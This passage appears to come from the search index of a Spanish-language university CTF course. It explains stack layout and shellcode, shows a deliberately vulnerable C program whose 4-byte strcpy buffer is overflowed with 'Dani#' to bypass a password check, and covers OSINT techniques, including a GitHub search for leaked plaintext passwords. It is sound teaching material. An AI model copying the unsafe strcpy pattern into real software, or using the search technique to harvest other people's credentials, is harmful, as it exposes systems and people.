disponible.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eHeap\u003c/strong\u003e: Espacio que maneja la memoria dinámica, es decir, en el caso de C, las variables declaradas con \u003ccode\u003emalloc\u003c/code\u003e, además de algunas funciones.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eBSS\u003c/strong\u003e: Memoria variable reservada antes de ejecutar el \u003cem\u003emain\u003c/em\u003e de un programa en C.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eData\u003c/strong\u003e: Constantes.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eText\u003c/strong\u003e: Instrucciones en ASM a ejecutar.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"el-programa-en-memoria-y-su-ejecución\"\u003eEl programa en memoria y su ejecución\u003c/h3\u003e\n\u003cp\u003eEn el bloque \u003ccode\u003eData\u003c/code\u003e se ubica una copia de las instrucciones que componen el programa que se está ejecutando. Debido a lo anterior, este bloque suele ser \u003cem\u003ede solo lectura\u003c/em\u003e. Para saber en qué instrucción se está en cada momento del programa, se almacena en \u003ccode\u003eeip\u003c/code\u003e el valor de la instrucción actual, el cual es incrementado en una posición cada vez que se finaliza de ejecutar una instrucción, excepto en casos en los que se ejecuta una instrucción \u003ccode\u003ejmp\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003eLas instrucciones \u003ccode\u003ecmp\u003c/code\u003e y \u003ccode\u003etest\u003c/code\u003e actualiza\u003c/p\u003e\n\u003cp\u003eLas instrucciones \u003ccode\u003ejmp\u003c/code\u003e ejecutan un salto incondicional hacia una nueva dirección de memoria indicada en la misma instrucción. También existen \u003cem\u003ejump condicionales\u003c/em\u003e, los cuales se ejecutan según el estado de flags del registro \u003ccode\u003eflags\u003c/code\u003e. \u003ca href=\"http://unixwiz.net/techtips/x86-jumps.html\"\u003eAcá\u003c/a\u003e se pueden ver los tipos de saltos.\u003c/p\u003e\n\u003ch3 id=\"la-pila-_stack_\"\u003eLa Pila (\u003cem\u003eStack\u003c/em\u003e)\u003c/h3\u003e\n\u003cp\u003eComo se mencionó anteriormente, la pila es el lugar en el que se guardan las variables locales de las funciones. Cada vez que entramos a una función, creamos un nuevo \u003cem\u003eframe\u003c/em\u003e, el cual se inicializa como una pila vacía, en el cual colocamos las nuevas variables locales a crearse. Al momento de salir del frame, este se descarta, activándose nuevamente el frame inmediatamente anterior.\u003c/p\u003e\n\u003cp\u003eAl entrar a un nuevo frame, se guarda la dirección de memoria actual dentro de la función (\u003ccode\u003eEIP\u003c/code\u003e) en la misma pila, y luego este valor se llena con el de la función anidada. De esta forma, al salir de la función anidada, se sabrá como volver a la función anterior.\u003c/p\u003e\n\u003cp\u003e¿Cómo sabemos donde parte y donde termina la pila? Usamos los punteros \u003ccode\u003eesp\u003c/code\u003e y \u003ccode\u003eebp\u003c/code\u003e para guardar estos datos. \u003ccode\u003eebp\u003c/code\u003e registra la dirección de memoria en la cual parte el frame actual, mientras \u003ccode\u003eesp\u003c/code\u003e guarda la dirección de memoria siguiente a la última utilizada. Cuando se crea un frame nuevo, ambos valores se guardan en la pila y se setean al valor siguiente al último de la pila, emulando de este modo una pila vacía, ya que base y tope son la misma posición.\u003c/p\u003e\n\u003cp\u003eEl siguiente conjunto de imágenes muestra cómo se opera en la pila y cómo se crean frames.\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"../2021-06-18-14-05-47.png\" alt=\"\"\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"../2021-06-18-14-06-41.png\" alt=\"\"\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"../2021-06-18-14-07-38.png\" alt=\"\"\u003e\u003c/p\u003e\n\u003cp\u003ePara eliminar un frame, se siguen los pasos inversos de la segunda imagen, es decir, se cargan los valores de más arriba de la pila como \u003ccode\u003eesp\u003c/code\u003e, \u003ccode\u003eebp\u003c/code\u003e y \u003ccode\u003eeip\u003c/code\u003e.\u003c/p\u003e\n\u003ch3 id=\"shellcode\"\u003eShellcode\u003c/h3\u003e\n\u003cp\u003e\u003cimg src=\"../2021-06-18-11-56-26.png\" alt=\"\"\u003e\u003c/p\u003e\n\u003cp\u003e¿Cómo se guarda el código que ejecutamos en \u003ccode\u003eData\u003c/code\u003e? Al igual que cualquier dato del computador: usando \u003ccode\u003e0s\u003c/code\u003e y \u003ccode\u003e1s\u003c/code\u003e. Esto quiere decir que una variable con la forma y valor adecuado podría perfectamente ser interpretada como un programa si logramos que \u003ccode\u003eEIP\u003c/code\u003e apunte a la zona de memoria en que se encuentra guardada.\u003c/p\u003e\n\u003cp\u003eLa representación en texto de un código ejecutable es conocida como \u003ccode\u003eshellcode\u003c/code\u003e cuando ésta permite levantar una \u003ccode\u003eshell\u003c/code\u003e luego de ser ejecutada.\u003c/p\u003e\n\u003cp\u003eEs posible encontrar un listado de shellcodes clasificados por OS y arquitectura de procesador en \u003ca href=\"https://www.exploit-db.com/shellcodes\"\u003eeste enlace\u003c/a\u003e o \u003ca href=\"http://shell-storm.org/shellcode/\"\u003eacá\u003c/a\u003e. También es posible crear shellcodes propios usando herramientas especiales o incluso a mano, como muestra \u003ca href=\"https://www.exploit-db.com/docs/english/13610-building-your-own-ud-shellcodes-part-1.pdf\"\u003eeste tutorial\u003c/a\u003e.\u003c/p\u003e\n\u003ch3 id=\"el-ataque\"\u003eEl Ataque\u003c/h3\u003e\n\u003cp\u003eUn ataque de Buffer Overflow se aprovecha de las nulas protecciones que algunos lenguajes de bajo nivel poseen sobre el acceso a memoria. Para ejemplificarlo, contaremos con el siguiente programa:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"chroma\"\u003e\u003ccode class=\"language-c++\" data-lang=\"c++\"\u003e\u003cspan class=\"cp\"\u003e#include\u003c/span\u003e \u003cspan class=\"cpf\"\u003e\u0026lt;stdlib.h\u0026gt;\u003c/span\u003e\u003cspan class=\"cp\"\u003e\n\u003c/span\u003e\u003cspan class=\"cp\"\u003e#include\u003c/span\u003e \u003cspan class=\"cpf\"\u003e\u0026lt;stdio.h\u0026gt;\u003c/span\u003e\u003cspan class=\"cp\"\u003e\n\u003c/span\u003e\u003cspan class=\"cp\"\u003e#include\u003c/span\u003e \u003cspan class=\"cpf\"\u003e\u0026lt;string.h\u0026gt;\u003c/span\u003e\u003cspan class=\"cp\"\u003e\n\u003c/span\u003e\u003cspan class=\"cp\"\u003e\u003c/span\u003e\u003cspan class=\"kt\"\u003eint\u003c/span\u003e \u003cspan class=\"nf\"\u003emain\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"kt\"\u003eint\u003c/span\u003e \u003cspan class=\"n\"\u003eargc\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"kt\"\u003echar\u003c/span\u003e \u003cspan class=\"o\"\u003e*\u003c/span\u003e\u003cspan class=\"n\"\u003eargv\u003c/span\u003e\u003cspan class=\"p\"\u003e[])\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n    \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eargc\u003c/span\u003e \u003cspan class=\"o\"\u003e!=\u003c/span\u003e \u003cspan class=\"mi\"\u003e2\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n        \u003cspan class=\"n\"\u003eprintf\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;usage: %s name\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003eargv\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e]);\u003c/span\u003e\n        \u003cspan class=\"n\"\u003eexit\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"mi\"\u003e1\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n    \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n    \u003cspan class=\"kt\"\u003echar\u003c/span\u003e \u003cspan class=\"n\"\u003epassword\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"sc\"\u003e\u0026#39;a\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n    \u003cspan class=\"kt\"\u003echar\u003c/span\u003e  \u003cspan class=\"n\"\u003enombre\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"mi\"\u003e4\u003c/span\u003e\u003cspan class=\"p\"\u003e];\u003c/span\u003e\n    \u003cspan class=\"n\"\u003estrcpy\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003enombre\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003eargv\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"mi\"\u003e1\u003c/span\u003e\u003cspan class=\"p\"\u003e]);\u003c/span\u003e\n    \u003cspan class=\"n\"\u003eprintf\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;hola %s. Veremos si tienes acceso...\u003c/span\u003e\u003cspan class=\"se\"\u003e\\n\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003enombre\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n    \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003epassword\u003c/span\u003e \u003cspan class=\"o\"\u003e==\u003c/span\u003e \u003cspan class=\"sc\"\u003e\u0026#39;#\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n        \u003cspan class=\"n\"\u003eprintf\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;Acceso otorgado! (password=%c)\u003c/span\u003e\u003cspan class=\"se\"\u003e\\n\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003epassword\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n    \u003cspan class=\"p\"\u003e}\u003c/span\u003e \u003cspan class=\"k\"\u003eelse\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n        \u003cspan class=\"n\"\u003eprintf\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;Acceso denegado (password=%c)\u003c/span\u003e\u003cspan class=\"se\"\u003e\\n\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003epassword\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n    \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n    \u003cspan class=\"n\"\u003eexit\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eLas variables \u003ccode\u003epassword\u003c/code\u003e y \u003ccode\u003enombre\u003c/code\u003e se almacenan  en la pila de forma consecutiva. El espacio morado corresponde a cada byte en la pila de la variable \u003ccode\u003enombre\u003c/code\u003e, y el espacio verde al único \u003ccode\u003echar\u003c/code\u003e de la variable \u003ccode\u003epassword\u003c/code\u003e. Si guardamos \u0026ldquo;Ana\u0026rdquo; en \u003ccode\u003enombre\u003c/code\u003e, el stack quedaría así:\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"../2021-06-18-15-15-29.png\" alt=\"\"\u003e\u003c/p\u003e\n\u003cp\u003eEl \u003ccode\u003e\\0\u003c/code\u003e final corresponde al byte nulo, usado para marcar el fin de una cadena de texto.\u003c/p\u003e\n\u003cp\u003eEn cambio, si entregásemos el valor \u003ccode\u003eDani#\u003c/code\u003e como \u003ccode\u003enombre\u003c/code\u003e, el char de \u003ccode\u003epassword\u003c/code\u003e se vería sobreescrito por el \u003ccode\u003e#\u003c/code\u003e, lo que nos dejaría entrar a la branch \u003cem\u003eAcceso otorgado!\u003c/em\u003e.\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"../2021-06-18-22-13-56.png\" alt=\"\"\u003e\u003c/p\u003e\n\u003cp\u003eEsta misma estrategia de overflow en variables se puede usar para sobreescribir más allá de las variables locales:\u003c/p\u003e\n\u003cp\u003eSupongamos que estamos en una función con una variable local \u003ccode\u003enombre\u003c/code\u003e. Más allá de esta variable encontraremos en la pila dos valores: \u003ccode\u003eret\u003c/code\u003e (Dirección de retorno del \u003ccode\u003eEIP\u003c/code\u003e al finalizar la función) y \u003ccode\u003eEBP\u003c/code\u003e  (puntero a la base de la pila del frame inferior). Si agrandamos \u003ccode\u003enombre\u003c/code\u003e lo suficiente, podremos sobreescribir \u003ccode\u003eret\u003c/code\u003e con un valor a nuestra elección, el cual podría apuntar a una dirección de memoria en la que sabemos que hay código útil.\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"../2021-06-18-22-34-46.png\" alt=\"\"\u003e\u003c/p\u003e\n\u003cp\u003eLa mejor referencia para entender paso a paso un Buffer Overflow la pueden encontrar en el artículo \u003ca href=\"./smash-stacking.pdf\"\u003eSmashing the Stack for Fun and Profit\u003c/a\u003e del colectivo Hacker \u003cem\u003eAleph One\u003c/em\u003e.\n)\u003c/p\u003e\n\u003ch3 id=\"limitaciones\"\u003eLimitaciones:\u003c/h3\u003e\n\u003cp\u003eSi bien lo anterior fue un problema sumamente grabe hace varios años, hoy en día existen una serie de mitigaciones en distintos niveles para evitar este tipo de comportamientos anómalos, acá mencionamos algunas:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eA nivel de sist. Operativo\u003c/strong\u003e: Mitigaciones que dependen del sist. operativo usado para ejecutar el programa. Hoy en día todas se encuentran activas por defecto, salvo para la ejecución de programas antiguos que no las soportan.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eWrite XOR Execute\u003c/strong\u003e: Característica que limita el uso de la memoria de un proeso para que ésta sea escribible O ejecutable, pero no ambas a la vez.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eASLR\u003c/strong\u003e: Direcciones de memoria de una aplicación se aleatorizan en cada ejecución, con lo que se dificulta la posibilidad de saltar a un espacio específico.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eDEP\u003c/strong\u003e: Marcar algunas páginas de memoria como explícitamente no ejecutables.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eA nivel de compilación\u003c/strong\u003e: Estas mitigaciones son flags del compilador que dificultan la explotación de buffer overflows.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eStack Canaries\u003c/strong\u003e: Valores aleatorios en la pila que se colocan al entrar a un frame y luego se revisan al salir de él, de esta forma, se dificulta la modificación del stack a través de overflows, ya que es necesario adivinar el valor original del canario colocado.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"uso-en-ctfs\"\u003eUso en CTFs\u003c/h3\u003e\n\u003cp\u003ePor temas de tiempo y de alcance, no contaremos en esta iteración del curso con material especial para preparar payloads en CTFs. Sin embargo, veremos en la clase en vivo el siguiente tutorial elaborado por \u003ca href=\"https://padraignix.github.io/reverse-engineering/2019/09/28/buffer-overflow-practical-case-study\"\u003epadragnix\u003c/a\u003e. El link incluye harto material relacionado e incluso una presentación de PowerPoint para revisar.\u003c/p\u003e\n"},{id:39,href:"/docs/pwning/ejercicios/",title:"Ejercicios de Pwning",description:null,content:"\u003ch3 id=\"escalamiento-de-privilegios\"\u003eEscalamiento de Privilegios\u003c/h3\u003e\n\u003cp\u003e\u003ca href=\"https://tryhackme.com/room/25daysofchristmas\"\u003eDía 8 (Task 14) del Advent of Cyber 2019 (TryHackMe)\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://tryhackme.com/room/linuxprivescarena\"\u003eLinux PrivEsc Arena\u003c/a\u003e\u003c/p\u003e\n\u003ch3 id=\"buffer-overflow\"\u003eBuffer Overflow\u003c/h3\u003e\n"},{id:40,href:"/docs/osint/",title:"OSINT",description:null,content:""},{id:41,href:"/docs/osint/intro/",title:"Intro a OSINT",description:null,content:"\u003cp\u003e\u003cem\u003eOpen Source Intelligence\u003c/em\u003e (OSINT) es una metodología para recolectar y analizar información mediante fuentes\nde tipo \u003cem\u003eopen source\u003c/em\u003e. Es decir, cualquier información que esté disponible públicamente.\nEsto se puede hacer de manera manual, pero, dependiendo del ámbito de la búsqueda, existen herramientas\npara automatizar el proceso de cierta forma. Este tema rara vez aparece en competencias de CTF, pero de todas\nformas se pueden encontrar con challenges de este tipo.\u003c/p\u003e\n\u003c!-- CC5325{4pun73_f149} --\u003e\n\u003cp\u003eLa información obtenida mediante este método incluye:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eDatos personales (nombre, rut, email, dirección, etc)\u003c/li\u003e\n\u003cli\u003ePersonas, empresas o entidades relacionadas\u003c/li\u003e\n\u003cli\u003eDominios, subdominios, IPs\u003c/li\u003e\n\u003cli\u003eNombres de usuario\u003c/li\u003e\n\u003cli\u003eDispositivos\u003c/li\u003e\n\u003cli\u003eY muchas otras cosas\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003ePara poder realizar el proceso de OSINT de manera efectiva, primero se necesita un punto de partida:\nalgún tipo de información que nos indique el contexto de la búsqueda, y por donde es posible comenzar\na buscar. Por ejemplo, el challenge puede contener simplemente el nombre de una persona, y para resolverlo\ndeberán utilizar todas las herramientas disponibles hasta encontrar la flag. Otras veces también se explicita\nel dato que deben encontrar, como la ubicación de esta persona en una hora específica,\ncon lo cual disminuye el rango de opciones.\u003c/p\u003e\n\u003cp\u003eEn algunos casos puede ser necesario realizar búsquedas en redes sociales, ya sea las clásicas (Facebook,\nTwitter, Instagram, Linkedin, etc) o en otras más rebuscadas y poco conocidas.\nLa forma de buscar dependerá fuertemente de la red social en específico que están viendo, y usualmente\nel proceso tendrá que ser hecho de manera manual.\u003c/p\u003e\n"},{id:42,href:"/docs/osint/google/",title:"Google Hacking",description:null,content:"\u003cp\u003eTodos sabemos cómo hacer búsquedas en Google (o cualquier otro motor de búsqueda similar):\nsimplemente ingresamos las palabras relevantes en el campo de búsqueda y dejamos que el algoritmo haga su\ntrabajo. Sin embargo internet es muy (MUY) grande, y muchas veces obtenemos resultados que coinciden con\nnuestra búsqueda, pero no nos son útiles. Esto hace que el proceso de investigación sea más lento y menos\neficiente.\u003c/p\u003e\n\u003cp\u003eAfortunadamente la gran mayoría de los motores de búsqueda implementan algún tipo de búsqueda avanzada, que nos\npermite filtrar muchos de los falsos positivos que encontramos normalmente. Aquí estudiaremos la implementación\nde Google, ya que suele ser la más efectiva, pero también existen sistemas parecidos de búsqueda para\nDuckDuckGo, Bing y otros.\u003c/p\u003e\n\u003ch2 id=\"google-dorks\"\u003eGoogle Dorks\u003c/h2\u003e\n\u003cp\u003e\u003ca href=\"https://en.wikipedia.org/wiki/Google_hacking\"\u003eGoogle Hacking\u003c/a\u003e, o también llamado \u003cem\u003eGoogle Dorks\u003c/em\u003e, es una\nforma de realizar búsquedas en Google que nos permite filtrar ciertas palabras, imponer restricciones de\ntipos de archivos o de fuentes, realizar la búsqueda solo en el título, URL o cuerpo, entre muchas otras cosas.\nEsto se hace mediante la inclusión de ciertos flags o caracteres en la búsqueda. Pueden encontrar una\nlista completa de flags \u003ca href=\"https://gbhackers.com/latest-google-dorks-list/\"\u003eaquí\u003c/a\u003e.\u003c/p\u003e\n\u003cp\u003eLas más útiles en general son las siguientes:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eExclusión\u003c/strong\u003e: Se pueden excluir todos los resultados que contengan cierto término de la forma \u003ccode\u003e-\u0026lt;keyword\u0026gt;\u003c/code\u003e.\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eResultado Literal\u003c/strong\u003e: Si quieren buscar por un término literal (excluyendo palabras parecidas, sinónimos, etc),\nutilizan las comillas dobles \u003ccode\u003e\u0026quot;\u0026lt;keyword\u0026gt;\u0026quot;\u003c/code\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eTipo de Archivo\u003c/strong\u003e: Si están buscando algún tipo de archivo en específico, como PDF,\nutilizan \u003ccode\u003efiletype:\u0026lt;type\u0026gt;\u003c/code\u003e.\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eFuente\u003c/strong\u003e: Si están buscando resultados exclusivamente de un sitio en particular usan \u003ccode\u003esite:\u0026lt;URL\u0026gt;\u003c/code\u003e.\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eLa flag de exclusión se puede combinar con otras flags, como para excluir todos los resultados de un\nsitio en particular \u003ccode\u003e-site:\u0026lt;URL\u0026gt;\u003c/code\u003e.\u003c/p\u003e\n\u003ch2 id=\"ejemplo\"\u003eEjemplo\u003c/h2\u003e\n\u003cp\u003eQueremos buscar información sobre inyecciones SQL, por lo que hacemos lo siguiente:\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"../google-search1.png\" alt=\"SQLi search\"\u003e\u003c/p\u003e\n\u003cp\u003ePero nosotros queremos solo resultados de OWASP, por lo que agregamos la flag \u003ccode\u003esite:owasp.org\u003c/code\u003e y obtenemos\nlo que queremos (ignorando el AD):\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"../google-search2.png\" alt=\"SQLi search from OWASP\"\u003e\u003c/p\u003e\n\u003cp\u003eFinalmente, los documentos académicos usualmente están en formato PDF, por lo que buscamos solo resultados\nque cumplan esa condición con \u003ccode\u003efiletype:pdf\u003c/code\u003e:\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"../google-search3.png\" alt=\"SQLi search in PDF format\"\u003e\u003c/p\u003e\n"},{id:43,href:"/docs/osint/github/",title:"Búsqueda en Github",description:null,content:"\u003cp\u003eGithub contiene una cantidad impresionantemente grande repositorios, código y datos. Muchas veces se puede\nencontrar información privada dentro de estos, como contraseñas, por lo cual poder buscar dentro de\nellos es muy útil. Esto se hace con la \u003ca href=\"https://github.com/search/advanced\"\u003ebúsqueda avanzada de Github\u003c/a\u003e,\nla cual retorna información sobre los repositorios públicos.\u003c/p\u003e\n\u003cp\u003eDe manera similar a Google Dorks, Github tiene un sistema de flags en su búsqueda para filtrar los resultados.\nPueden encontrar documentación sobre esto \u003ca href=\"https://docs.github.com/en/github/searching-for-information-on-github/getting-started-with-searching-on-github\"\u003eaquí\u003c/a\u003e.\nEn este caso, los flags disponibles están más enfocados a filtrar características importantes de un\nrepositorio (por ejemplo la cantidad de forks con \u003ccode\u003efork:\u0026lt;n\u0026gt;\u003c/code\u003e). También se puede buscar repos cuyos archivos\ncumplan ciertas características, como en su extensión (\u003ccode\u003eextension:\u0026lt;ext\u0026gt;\u003c/code\u003e).\u003c/p\u003e\n\u003ch2 id=\"ejemplo\"\u003eEjemplo\u003c/h2\u003e\n\u003cp\u003eBuscaremos repositorios que contengan la palabra \u003ccode\u003epassword\u003c/code\u003e con el objetivo de encontrar alguna contraseña\nolvidada que no debería estar ahí. Pero al igual que con las búsquedas en Google, queremos restringir\nlos resultados obtenidos para filtrar los falsos positivos. Para eso además incluimos las flags\n\u003ccode\u003eforks:0\u003c/code\u003e, ya que un repositorio con forks probablemente está siendo revisado y la contraseña ya fue\nencontrada, y \u003ccode\u003eextension:txt\u003c/code\u003e, pues buscamos contraseñas en texto plano.\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"../github-passwords.png\" alt=\"Github Passwords\"\u003e\u003c/p\u003e\n\u003cp\u003eEncontramos muchos resultados, los cuales deben ser revisados manualmente, o se puede restringir aún más\nla búsqueda para acelerar el proceso.\u003c/p\u003e\n"},{id:44,href:"/docs/osint/theharvester/",title:"The Harvester",description:null,content:"\u003cp\u003eTheHarvester es una herramienta utilizada para buscar subdominios, IPs y correos asociados a un dominio\nparticular. Esto se hace por medio de motores de búsqueda, como Google, Bing, DuckDuckGo, Github, Linkedin,\nTwitter, etc. Pueden encontrar la herramienta \u003ca href=\"https://github.com/laramies/theHarvester\"\u003eaquí\u003c/a\u003e.\u003c/p\u003e\n\u003cp\u003eEsto es muy útil para hacer análisis perimetrales de una empresa, en donde no se conoce todos los subdominios\nque posee. También sirve para encontrar posibles usuarios, para luego realizar ataques de fuerza bruta,\no buscar más información sobre estas personas.\u003c/p\u003e\n\u003ch2 id=\"ejemplo\"\u003eEjemplo\u003c/h2\u003e\n\u003cp\u003eQueremos encontrar información relacionada al dominio \u003ccode\u003euchile.cl\u003c/code\u003e. Utilizamos la flag \u003ccode\u003e-d\u003c/code\u003e para determinar el\ndominio que será buscado y \u003ccode\u003e-b\u003c/code\u003e para especificar el motor de búsqueda. Google suele ser el más efectivo, por lo\nque lo elegimos.\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"../theharvester1.png\" alt=\"theHarvester Query\"\u003e\u003c/p\u003e\n\u003cp\u003eObtenemos los resultados y observamos que no se encontró IPs, pero sí se logró encontrar muchos emails y\nsubdominios, de los cuales la gran mayoría tiene una IP asignada.\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"../theharvester2.png\" alt=\"theHarvester Results\"\u003e\u003c/p\u003e\n"},{id:45,href:"/docs/osint/haveibeenpwned/",title:"Have I Been Pwned",description:null,content:"\u003cp\u003e\u003ca href=\"https://haveibeenpwned.com/\"\u003eHave I Been Pwned\u003c/a\u003e es un sitio web que recopila contraseñas filtradas, asociadas a\nun correo. Luego, los usuarios pueden ingresar su correo, y el sitio responde si se ha encontrado\ncontraseñas para ese correo, y de dónde salieron. Esto puede ser particularmente importante, pues la gran\nmayoría de las personas reutilizan sus contraseñas en muchos lugares diferentes, de vez en cuando con alguna\nvariación mínima.\u003c/p\u003e\n\u003cp\u003eEl sitio también permite buscar de manera segura si una contraseña particular ha sido filtrada en algún momento.\nEsto funciona calculando el Hash de la contraseña de manera local, y luego enviando una parte de este Hash\nal servidor. El servidor responde con todos los hashes que coinciden con el valor enviado, los cuales son\ncomparados localmente con el Hash completo de la contraseña. De esta forma, en ningún momento se envía\nla contraseña (ni su Hash completo) al servidor, dejando que el cliente haga las comparaciones localmente.\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eNota\u003c/strong\u003e: Que un correo aparezca comprometido no significa que actualmente lo esté. Quiere decir que en algún\nmomento alguna contraseña asociada a ese correo se filtró.\u003c/p\u003e\n\u003ch2 id=\"ejemplo\"\u003eEjemplo\u003c/h2\u003e\n\u003cp\u003eQueremos verificar si un correo ha sido comprometido, por lo que ingresamos a\n\u003ca href=\"https://haveibeenpwned.com/\"\u003eHave I Been Pwned\u003c/a\u003e y hacemos la búsqueda.\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"../haveibeenpwned-search.png\" alt=\"Búsqueda en HaveIBeenPwned\"\u003e\u003c/p\u003e\n\u003cp\u003eSi no se encuentra \u003cem\u003ebreaches\u003c/em\u003e relacionados, el sitio nos lo indica en verde.\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"../haveibeenpwned-safe.png\" alt=\"No Comprometido\"\u003e\u003c/p\u003e\n\u003cp\u003eEn cambio, si efectivamente ha habido filtraciones de contraseñas asociadas al correo, se mostrará en rojo.\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"../haveibeenpwned-pwned.png\" alt=\"Comprometido\"\u003e\u003c/p\u003e\n\u003cp\u003eMás abajo podemos revisar específicamente dónde y cuándo se produjo la filtración. Esto nos ayuda a determinar\nsi la contraseña filtrada fue una antigua o actual, y nos muestra específicamente qué datos fueron comprometidos.\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"../haveibeenpwned-breaches.png\" alt=\"Breaches\"\u003e\u003c/p\u003e\n"},{id:46,href:"/docs/osint/shodan/",title:"Shodan",description:null,content:"\u003cp\u003e\u003ca href=\"https://www.shodan.io/\"\u003eShodan\u003c/a\u003e es un motor de búsqueda que permite encontrar tipos específicos de computadores o dispositivos\nconectados a internet. Para esto implementa una variedad de filtros que ayudan en la búsqueda,\nde forma de hacerla más rápida y efectiva. Dentro de estos resultados pueden encontrar servicios mal\nconfigurados, los cuales no implementan medidas de seguridad y son accesibles para cualquier persona.\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eImportante\u003c/strong\u003e: En Shodan pueden encontrar servicios privados a los cuales ustedes no tienen permiso de ingresar.\n\u003cstrong\u003eNo interactúen con estos servicios\u003c/strong\u003e, no intenten sacar información ni entren a revisar de qué se trata.\nPueden estar violando la privacidad de ciertas personas y luego caer en problemas legales.\u003c/p\u003e\n\u003ch2 